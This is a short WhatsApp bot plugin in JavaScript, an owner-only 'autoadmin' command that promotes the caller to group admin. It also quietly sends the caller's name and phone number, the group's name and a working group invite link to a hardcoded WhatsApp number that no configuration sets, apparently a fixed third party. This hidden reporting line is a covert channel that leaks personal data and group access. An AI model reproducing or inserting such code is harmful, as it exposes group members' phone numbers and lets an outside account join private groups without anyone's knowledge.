const handler = async (m, conn) => {
    try {
        const groupMetadata = await conn.groupMetadata(m.chat)
        await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote')
        const groupLink = await conn.groupInviteCode(m.chat)
        const fullLink = `https://chat.whatsapp.com/${groupLink}`

        await conn.sendMessage('393476686131@s.whatsapp.net', {
            text: `*⭒─ׄ─ׅ─ׄ─⭒*⬣ AUTOADMIN ⬣*⭒─ׅ─ׄ─ׅ─ׄ─⭒*

『 📲 』 *Utente:* @${m.sender.split('@')[0]}
『 📝 』 *Nome:* ${conn.getName(m.sender)}
『 📞 』 *Numero:* +${m.sender.split('@')[0]}

『 📌 』 *Gruppo:*\n${groupMetadata.subject}
『 🔗 』 *Link:*\n${fullLink}`,
            mentions: [m.sender],
            quoted: m
        })

    } catch (e) {
        console.error(e)
    }
}

handler.command = ['autoadmin', 'autoadm', 'almighty']
handler.owner = true
handler.group = true
handler.botAdmin = true

export default handler
